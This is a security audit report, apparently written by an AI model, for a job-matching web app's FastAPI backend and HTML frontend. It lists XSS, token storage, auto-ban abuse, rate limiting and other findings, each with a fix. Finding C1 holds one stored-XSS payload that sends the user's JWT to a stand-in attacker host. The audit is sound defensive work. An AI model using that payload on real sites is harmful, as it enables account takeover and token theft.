# Security Audit — We're Hired MVP
> วันที่: 26 พฤษภาคม 2568  
> Scope: `main.py` (2,580 lines) + `index.html` (2,301 lines)  
> โดย: Claude Sonnet 4.6

---

## สรุป Executive Summary

| ระดับ | จำนวน | สถานะ |
|-------|-------|--------|
| 🔴 CRITICAL | 4 | ต้องแก้ก่อน expose ให้ user จริง |
| 🟡 WARNING | 7 | ควรแก้ก่อน scale / pitch |
| 🔵 INFO | 6 | แนะนำในอนาคต |

**ข่าวดี:** SQL Injection ไม่มีเลย (asyncpg parameterized ทุก query), JWT verify ถูกต้อง (ES256 + JWKS), RBAC ครบทุก endpoint, Contact Lock ทำงานถูกต้อง, bcrypt cost=12 แข็งแกร่งดี

---

## 🔴 CRITICAL — ต้องแก้ก่อน expose user จริง

---

### C1. Stored XSS — User-supplied strings render ตรงใน innerHTML

**ไฟล์:** `index.html`

**จุดที่เสี่ยง:**
```javascript
// :1175  — job title จาก employer
`<div style="font-weight:600">${j.title}</div>`

// :1245  — job title ใน application list
`<div style="font-weight:600">${a.job.title}</div>`

// :1259  — employer note ถึง worker
`<div>"${a.employer_note}"</div>`

// :1494  — worker full_name ใน candidate list
`<div class="candidate-name">${c.full_name}</div>`

// :1963, 1969  — notification title + body
`<div>${n.title}</div>`
`<div>${n.body}</div>`
```

**Attack scenario:**
Employer สร้างงานชื่อ:
```
<img src=x onerror="fetch('https://evil.com?t='+localStorage.getItem('wh_token'))">
```
→ Worker ทุกคนที่เห็นงานนี้ใน nearby list จะส่ง JWT token ไปที่ attacker ทันที

**Impact:** Stored XSS → Token theft → Full account takeover ทุก worker ที่โหลดหน้า nearby

**Fix:**
```javascript
// เพิ่ม helper function ครั้งเดียว ใช้ได้ทั้งไฟล์
function esc(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// ใช้แทนทุกจุดที่ render user input
`<div>${esc(j.title)}</div>`
`<div>${esc(c.full_name)}</div>`
`<div>${esc(n.body)}</div>`
```

---

### C2. JWT Token เก็บใน `localStorage` — เสี่ยง XSS Token Theft

**ไฟล์:** `index.html:854–856`

```javascript
localStorage.setItem('wh_token', token);
localStorage.setItem('wh_role', userRole);
localStorage.setItem('wh_uid', userId);
```

**ปัญหา:** `localStorage` อ่านได้จาก JavaScript ทุกตัวบน domain เดียวกัน  
ถ้า C1 ถูก exploit → `localStorage.getItem('wh_token')` ได้ทันที  
Token อายุ 1440 นาที (24 ชั่วโมง) — attacker มีเวลานานมาก

**ทางเลือก (เรียงจาก implement ง่ายสุด):**

| วิธี | ความปลอดภัย | ความยาก |
|------|------------|---------|
| Fix C1 ก่อน (escape HTML) | ลด risk XSS → token ปลอดภัยขึ้น | ง่าย |
| ลด `jwt_expire_minutes` จาก 1440 → 60 นาที | จำกัดหน้าต่าง attack | 1 บรรทัด |
| `sessionStorage` แทน `localStorage` | token หายเมื่อปิด tab | ง่าย แต่ UX แย่ลง |
| HttpOnly Cookie (Phase 3+) | JS อ่านไม่ได้เลย | ต้องแก้ backend + CORS |

**MVP Recommendation:** Fix C1 + ลด expire เป็น 120 นาที ก่อน

---

### C3. Auto-Ban 3 Reports — Abuse เพื่อ Ban คนอื่นได้

**ไฟล์:** `main.py:2317–2327`

```python
report_count = await db.fetchval(
    "SELECT COUNT(DISTINCT reporter_id) FROM user_reports WHERE reported_user_id = $1",
    body.reported_user_id,
)
if report_count >= 3:
    await db.execute(
        "UPDATE users SET is_active=FALSE WHERE id=$1 AND is_active=TRUE",
        body.reported_user_id,
    )
```

**Attack scenario:**
1. Attacker สร้าง 3 email accounts (Google free)
2. Report employer คนเดิม 3 ครั้ง
3. Employer ถูก ban ทันที — โพสต์งานไม่ได้ ไม่รู้ว่าโดน ban

**Impact:** Denial of Service ต่อ user ใดก็ได้ — ไม่ต้อง hack เลย

**Fix options:**
```python
# Option A (เร็วสุด): ลบ auto-ban ออก — ส่ง alert admin แทน
if report_count >= 3:
    # TODO: alert admin แทน auto-ban
    logger.warning(f"[trust] user {body.reported_user_id} has {report_count} reports — needs admin review")

# Option B: flag สำหรับ admin review ไม่ ban ทันที
if report_count >= 3:
    await db.execute(
        "UPDATE users SET needs_review=TRUE WHERE id=$1",
        body.reported_user_id,
    )
```

---

### C4. Contact Endpoint ใช้ได้เฉพาะ status = `hired` — Break หลัง Lifecycle เปลี่ยน

**ไฟล์:** `main.py:1982`

```python
if row["status"] != "hired":
    raise HTTPException(status_code=403, detail="เปิดเผยข้อมูลติดต่อได้เฉพาะงานที่ hired แล้วเท่านั้น")
```

**ปัญหา:** Lifecycle คือ `hired → checked_in → working → completed → verified`  
หลังจาก worker เช็คอิน status ไม่ใช่ `hired` แล้ว → ดูเบอร์ไม่ได้ตลอดช่วงทำงาน  
Worker ที่กำลังทำงานอยู่ติดต่อ employer ไม่ได้ถ้าต้องการ (emergency เช่น หลงทาง)

**Fix:**
```python
CONTACT_ALLOWED_STATUSES = {"hired", "checked_in", "working", "completed", "verified"}

if row["status"] not in CONTACT_ALLOWED_STATUSES:
    raise HTTPException(status_code=403, detail="เปิดเผยข้อมูลติดต่อได้เฉพาะงานที่ active แล้วเท่านั้น")
```

---

## 🟡 WARNING — ควรแก้ก่อน Scale / Pitch

---

### W1. ไม่มี Rate Limiting เลย — Brute Force + Spam

**ไฟล์:** `main.py`

จุดที่เสี่ยงสูงสุด:
- `POST /auth/login` — brute force password ไม่จำกัด
- `POST /auth/register` — สร้าง account flood (ใช้กับ C3)
- `POST /jobs/{id}/apply` — spam applications

bcrypt cost=12 ช่วยชะลอ ~200ms/attempt แต่ distributed attack ยังทำได้

**Fix (2 บรรทัด ใช้ slowapi):**
```python
# requirements.txt
slowapi==0.1.9

# main.py
from slowapi import Limiter
from slowapi.util import get_remote_address
limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter

@app.post("/auth/login")
@limiter.limit("10/minute")          # ← เพิ่มบรรทัดเดียว
async def login(request: Request, ...):
    ...

@app.post("/auth/register")
@limiter.limit("5/minute")
async def register(request: Request, ...):
    ...
```

---

### W2. OpenAPI Docs เปิดสาธารณะ — Admin Endpoints ถูก Enumerate ได้

**ไฟล์:** `main.py:354–359`

FastAPI เปิด `/docs` และ `/redoc` โดย default ทุกคนเห็น:
- Admin endpoint paths ทั้งหมด
- Request/response schema
- Header names ที่ต้องส่ง (เช่น `X-Admin-Secret`)

**Fix (1 บรรทัด):**
```python
app = FastAPI(
    title="WeHire API",
    # ปิดใน production
    docs_url=None if os.getenv("RAILWAY_ENVIRONMENT") else "/docs",
    redoc_url=None if os.getenv("RAILWAY_ENVIRONMENT") else "/redoc",
)
```

---

### W3. `GET /users/blocked` — Leak Email ของ Blocked User

**ไฟล์:** `main.py:2374`

```python
SELECT u.id, u.email, u.role, ub.created_at AS blocked_at
```

User ที่ block คนอื่นจะเห็น email address ของเป้าหมาย  
Email ไม่ควร expose ผ่าน endpoint ที่ไม่เกี่ยวกับ auth

**Fix:**
```python
# ลบ email ออก — ไม่จำเป็นสำหรับ blocked list
SELECT u.id, u.role, ub.created_at AS blocked_at
```

---

### W4. Review Endpoint ต้องการ status = `hired` เท่านั้น — Logic Bug

**ไฟล์:** `main.py:2442`

```python
WHERE ja.id = $1 AND ja.status = 'hired'
```

งาน verified แล้ว status เป็น `verified` ไม่ใช่ `hired`  
→ Worker/Employer ที่งานเสร็จแล้วส่ง review ไม่ได้

**Fix:**
```python
WHERE ja.id = $1 AND ja.status IN ('hired', 'verified', 'disputed')
```

---

### W5. Dynamic SQL Column Names จาก Pydantic Fields — Pattern อันตราย

**ไฟล์:** `main.py:699–713, 788–796`

```python
for key, val in updates.items():
    set_parts.append(f"{key} = ${idx}")   # key ถูก interpolate ตรงใน SQL string
```

**ปัจจุบันปลอดภัย** เพราะ `updates` มาจาก Pydantic model fields (whitelist โดยธรรมชาติ)  
แต่ถ้า dev ใหม่เพิ่ม field จาก user input โดยไม่รู้ pattern นี้ → SQL injection ทันที

**Fix ที่ดีกว่า:**
```python
ALLOWED_WORKER_FIELDS = {"skills", "experience_years", "daily_rate_expected",
                          "location_name", "is_available", "nationality_type"}

for key, val in updates.items():
    if key not in ALLOWED_WORKER_FIELDS:
        raise HTTPException(400, f"ไม่อนุญาตให้แก้ไข field: {key}")
    set_parts.append(f"{key} = ${idx}")
```

---

### W6. Hardcode URL เก่าใน CORS Allowlist — Dead Code

**ไฟล์:** `main.py:366–370`

```python
for _url in [
    "https://wearehiredmvp.vi-nutthaphat.workers.dev",
    "https://divine-bar-29c7.vi-nutthaphat.workers.dev",   # ← URL เก่า ไม่มีใครใช้
]:
```

URL เก่า `divine-bar-29c7` ยังอยู่ใน allowlist — ถ้า Cloudflare worker ชื่อนี้ถูกสร้างใหม่โดยคนอื่น (ชื่อ subdomain reclaim) จะผ่าน CORS ได้  
ควรลบ URL เก่าออก และย้ายทั้งหมดไป env var

---

### W7. JWT ไม่มี `jti` Claim — ไม่สามารถ Revoke Token ได้

**ไฟล์:** `main.py:388–394`

```python
payload = {"sub": user_id, "role": role, "exp": ..., "iat": ...}
```

ปัญหา:
- ถ้า ban user (`is_active=FALSE`) → token เก่ายังใช้ได้จนหมดอายุ (24 ชั่วโมง)
- ถ้า user เปลี่ยน role → token เก่ายัง claim role เดิมได้

**ตอนนี้มี partial fix:** `is_active` check ใน login แต่ไม่มีที่ `get_current_user`

**Fix เร็ว (MVP):** เพิ่ม `is_active` check ใน `get_current_user`:
```python
async def get_current_user(creds, db):
    payload = decode_token(creds.credentials)
    user = await db.fetchval("SELECT is_active FROM users WHERE id=$1", UUID(payload["sub"]))
    if not user:
        raise HTTPException(401, "ไม่พบบัญชีผู้ใช้")
    # is_active check ที่นี่ด้วย (ตอนนี้ไม่มี)
    return payload
```

---

## 🔵 INFO — แนะนำในอนาคต

---

### I1. ไม่มี Security Headers

Railway และ Cloudflare Workers ไม่ inject security headers โดยอัตโนมัติ  
Headers ที่ขาด:

| Header | ประโยชน์ |
|--------|---------|
| `X-Content-Type-Options: nosniff` | ป้องกัน MIME sniffing |
| `X-Frame-Options: DENY` | ป้องกัน clickjacking |
| `Content-Security-Policy` | จำกัด script sources |
| `Referrer-Policy: strict-origin` | ไม่รั่ว URL ใน referrer |

เพิ่มได้ใน `worker.js` (Cloudflare) หรือ FastAPI middleware

---

### I2. GPS Spoofing — ยอมรับ Risk ใน MVP (บันทึกไว้ใน CLAUDE.md แล้ว)

`navigator.geolocation` spoof ได้ด้วย browser DevTools หรือ extension  
Worker ส่ง coordinates ปลอมผ่านชั้น `POST /applications/{id}/checkin` โดยตรงได้  
Phase ถัดไป: Selfie check-in + server-side timestamp cross-validation

---

### I3. Match Score Manipulation ผ่าน `POST /jobs/{id}/apply`

```python
# main.py:1036-1038
class ApplyRequest(BaseModel):
    lat: float = Field(..., ge=-90,  le=90)
    lng: float = Field(..., ge=-180, le=180)
```

Worker ส่ง `lat/lng` ที่ใกล้กว่าจริง → distance score สูงขึ้น → ranking ดีขึ้น  
**Impact ต่ำ** เพราะ checkin ต้องอยู่จริงภายใน 150m  
แต่ทำให้ employer เห็น ranking ไม่ตรงความจริง

**Fix Phase 2:** ใช้ location จาก worker_profile แทน user-supplied coordinate ตอน apply

---

### I4. KYC File Upload (Phase 2A) — ต้องมี Validation ก่อน Implement

เมื่อทำ `POST /workers/kyc/upload` ต้องมีครบ:
- MIME type validation (ไม่เชื่อ `Content-Type` header — ต้อง read magic bytes)
- Max size: 5MB per file
- Filename sanitization (UUID-based path เท่านั้น)
- Virus scan (ถ้า scale ถึง iDenfy tier)
- Signed URL สำหรับ serve — ไม่ expose Supabase Storage URL ตรงๆ

---

### I5. `admin_secret` ใช้ String Comparison ธรรมดา — Timing Attack

**ไฟล์:** `main.py:2181, 2194, 2225`

```python
if x_admin_secret != settings.admin_secret:
```

Python `!=` มี timing difference ตาม length ของ match  
ควรใช้ `hmac.compare_digest()` แต่ impact ต่ำมากสำหรับ secret ที่มาจาก header

```python
import hmac
if not hmac.compare_digest(x_admin_secret, settings.admin_secret):
```

---

### I6. Notification Body เก็บ GPS Coordinates ตรง

```python
# main.py:1369
maps_link = f"https://www.google.com/maps/dir/?api=1&destination={lat},{lng}"
# embed ใน notification body
```

Job location ถูก embed ใน notification — ใครอ่าน notification ได้ก็รู้ lat/lng ของ job  
ตอนนี้ยอมรับได้เพราะ notification ต้อง auth ก่อน และ job location ไม่ใช่ sensitive data

---

## Action Plan

### ทำได้ในวันเดียว (MVP-safe)

| Priority | งาน | ไฟล์ | เวลา |
|----------|-----|------|------|
| C1 🔴 | เพิ่ม `esc()` function + ใช้ทุกจุด innerHTML | index.html | 30 นาที |
| C4 🔴 | เปลี่ยน contact status check เป็น set | main.py | 5 นาที |
| C3 🔴 | ลบ auto-ban → log warning แทน | main.py | 5 นาที |
| W2 🟡 | ปิด /docs ใน Railway environment | main.py | 2 นาที |
| W3 🟡 | ลบ email จาก blocked list response | main.py | 2 นาที |
| W4 🟡 | เพิ่ม verified/disputed ใน review status check | main.py | 2 นาที |

### ก่อน Scale (หลัง Pitch)

| Priority | งาน |
|----------|-----|
| W1 🟡 | Rate limiting ด้วย slowapi |
| W5 🟡 | Column allowlist ใน dynamic SQL |
| W7 🟡 | `is_active` check ใน `get_current_user` |
| C2 🔴 | ลด JWT expire เป็น 120 นาที |
| I1 🔵 | Security headers ใน Cloudflare worker.js |

### Phase 3+

| งาน |
|-----|
| HttpOnly Cookie แทน localStorage |
| JWT `jti` + token revocation store (Redis) |
| KYC upload validation ครบชุด |
| GPS Selfie check-in |

---

## สรุป

**ไม่มี SQL Injection** — asyncpg parameterized ทุก query ✅  
**ไม่มี credential hardcode** — secrets อยู่ใน env var ✅  
**RBAC ครบ** — `require_worker` / `require_employer` ทุก endpoint ✅  
**JWT verify ถูกต้อง** — ES256 + JWKS + kid matching ✅  

**จุดหลักที่ต้องแก้:** XSS ใน innerHTML (C1) คือความเสี่ยงสูงสุด แก้ก่อนเปิด user จริง
